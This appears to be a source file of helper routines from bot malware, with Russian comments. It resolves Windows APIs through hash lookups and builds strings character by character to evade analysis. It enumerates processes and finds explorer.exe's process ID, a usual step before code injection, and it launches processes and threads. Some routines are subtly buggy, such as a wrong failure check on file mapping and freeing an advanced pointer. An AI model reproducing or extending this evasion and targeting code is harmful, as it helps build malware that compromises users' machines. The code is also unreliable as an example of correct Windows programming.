#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>

#include "GetApi.h"
#include "Strings.h"
#include "Crypt.h"
#include "Memory.h"
#include "Utils.h"
#include "BotUtils.h"
#include "md5.h"
#include "ntdll.h"


bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread )
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	m_memset( &si, 0, sizeof( STARTUPINFOW ) );	
	m_memset( &pi, 0, sizeof( PROCESS_INFORMATION ) );	
	
	si.cb		   = sizeof( STARTUPINFO );
	si.dwFlags     = STARTF_USESHOWWINDOW;
	si.wShowWindow = 1;

	if ( (BOOL)pCreateProcessW( Path, NULL, NULL, NULL, FALSE, dwFlags, NULL, NULL, &si, &pi ) != 0 )
	{
		*hProcess = pi.hProcess;
		*hThread  = pi.hThread;

		return true;
	}	

	return false;
}

bool RunFile( WCHAR *Path )
{
	HANDLE hThread;
	HANDLE hProcess;

	if ( RunFileEx( Path, NORMAL_PRIORITY_CLASS, &hProcess, &hThread ) )
	{
		return true;
	}

	return false;
}
HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param )
{
    DWORD lpThreadId; 
    return pCreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)lpStartAddress, param, NULL, &lpThreadId );
}


DWORD CalcHash( char *Str )
{
	if ( !Str )
	{
		return -1;
	}

	DWORD dwHash = 0;
	char *CopyStr = Str;
	
	while ( *CopyStr ) 
	{
		dwHash = ( ( dwHash << 7 ) & (DWORD)( -1 ) ) | ( dwHash >> ( 32 - 7 ) );
		dwHash = dwHash ^ ( *CopyStr );
		CopyStr++;
	}

	return dwHash;
}

DWORD CalcHashW( PWSTR str )
{
	if ( !str )
	{
		return 0;
	}

    DWORD hash = 0;
    PWSTR s = str;

    while (*s) 
    {
        hash = ((hash << 7) & (DWORD)-1) | (hash >> (32 - 7));
        hash = hash ^ *s;
        s++;
    }

    return hash;
}


char * FileToMD5(char *URL)
{
	//char *BotId = (char*)MemAlloc( 2048 );
	MD5_CTX ctx;	

	MD5Init(&ctx);
	MD5Update( &ctx, (unsigned char*)URL, m_lstrlen( URL ) );

	unsigned char buff[16];	
	MD5Final( buff, &ctx );
	char * UidHash =(char*)MemAlloc( 33 );;

	int p = 0;
	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
	
	for( int i = 0; i < 16; i++ )
	{
		pwsprintfA( &UidHash[p], "%02X", buff[i] );
		p += 2;
	}	
	
	UidHash[32] = '\0';

	
return UidHash;
}



LPVOID GetInfoTable( DWORD dwTableType )
{
	LPVOID lpPtr = NULL;

	DWORD dwSize = 0x4000;	

	NTSTATUS Status = 0;

	do
	{
		lpPtr = MemAlloc( dwSize );

		if ( lpPtr == NULL )
		{
			return NULL;
		}

		Status = (DWORD)pZwQuerySystemInformation( dwTableType, lpPtr, dwSize, NULL );

		if ( Status == STATUS_INFO_LENGTH_MISMATCH )
		{
			MemFree( lpPtr );
			dwSize = dwSize * 2;
		}
	} while ( Status == STATUS_INFO_LENGTH_MISMATCH );

	if ( Status == STATUS_SUCCESS )
	{
		return lpPtr;
	}

	MemFree( lpPtr );

	return NULL;
}


DWORD GetVirtualFreeAddr()
{
	DWORD dwAddr = (DWORD)GetProcAddressEx( NULL, 1, 0x5C17EC75 );
	return dwAddr;
}


DWORD GetFileHash( WCHAR *File )
{
	if ( !File )
	{
		return -1;
	}

	HANDLE hFile = (HANDLE)pCreateFileW( File, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return -1;
	}

	DWORD h = 0;
	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );

	HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );

	if ( hMapFile == INVALID_HANDLE_VALUE )
	{
		return -1;
	}

	LPBYTE pbyFile  = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

	char Hash[33];
	m_memset( Hash, 0, 33 );

	if ( pbyFile != NULL )
	{
		MD5_CTX ctx;	

		MD5Init(&ctx);
		MD5Update( &ctx, (unsigned char*)pbyFile, dwFileSize );

		unsigned char buff[16];	

		MD5Final( buff, &ctx );

		typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
		fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

		int p = 0;

		for( int i = 0; i < 16; i++ )
		{
			pwsprintfA( &Hash[p], "%02X", buff[i] );
			p += 2;
		}	
		
		Hash[32] = '\0';	
	}

	pUnmapViewOfFile( pbyFile );

	pCloseHandle( hFile );
	pCloseHandle( hMapFile );

	if ( !m_lstrlen( Hash ) )
	{
		return -1;
	}

	return CalcHash( Hash );
}



DWORD ExplorerPid = 0;

DWORD GetExplorerPid()
{
	// Функция возвращает идентификатор процесса эксплорера (Explorer.exe)

	if ( !ExplorerPid )
	{
		// Первым этапом пытаемся получить идентификатор по хэндлу окна системного
		// трэя.
		char Class[] = {'S','h','e','l','l','_','T','r','a','y','W','n','d',0};
		pGetWindowThreadProcessId(pFindWindowA(Class, NULL), &ExplorerPid);
	
		// В случае если не удалось определить идентификатор по хэндлу окна
		// определяем его по имени запущенного процесса	
		if ( !ExplorerPid )
			ExplorerPid = GetProcessIdByHash(0x490A0972);
	}

	return ExplorerPid;
}
DWORD GetProcessIdByHash( DWORD dwHash )
{
	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)GetInfoTable( SystemProcessInformation );

	DWORD dwSessionId = 0;

	DWORD dwPid = -1;

	if ( pProcess != NULL )
	{
		dwSessionId = GetCurrentSessionId();

		do
		{
			if ( dwSessionId == pProcess->uSessionId )
			{
				if ( pProcess->usName.Length )
				{
					char *ProcessName = ToAnsi( pProcess->usName.Buffer );

					m_lstrlwr( ProcessName );

					if ( CalcHash( ProcessName ) == dwHash )
					{
						dwPid = pProcess->uUniqueProcessId;
						break;
					}
				}
			}			

			pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext );

		} while ( pProcess->uNext != 0 );
	}

	MemFree( pProcess );

	return dwPid;
}
DWORD GetCurrentSessionId()
{
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	return Peb->SessionId;
}